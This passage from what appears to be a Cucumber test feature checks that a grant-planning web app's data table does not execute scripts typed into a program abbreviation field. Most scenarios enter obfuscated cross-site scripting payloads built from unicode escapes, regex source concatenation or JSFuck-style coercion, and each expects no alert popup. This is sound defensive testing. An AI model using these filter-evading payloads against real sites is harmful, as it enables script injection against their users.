      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                             | Field                |
      | ';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301689 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                             | Field                |
      | ';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301690 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                            | Field                |
      | ';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301691 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                               | Field                |
      | ';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301692 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                               | Field                |
      | ';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301693 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                  | Field                |
      | ;globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301694 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';window[/al/.source+/ert/.source](/XSS/.source);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301695 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';self[/al/.source+/ert/.source](/XSS/.source);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301696 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';this[/al/.source+/ert/.source](/XSS/.source);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301698 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      |  ';top[/al/.source+/ert/.source](/XSS/.source);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301699 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';parent[/al/.source+/ert/.source](/XSS/.source);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301700 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';frames[/al/.source+/ert/.source](/XSS/.source);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301701 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | ';globalThis[/al/.source+/ert/.source](/XSS/.source);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301702 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                        | Field                |
      |';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301703 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                        | Field                |
      |';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301704 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                        | Field                |
      |';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301705 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                        | Field                |
      | ';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301706 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
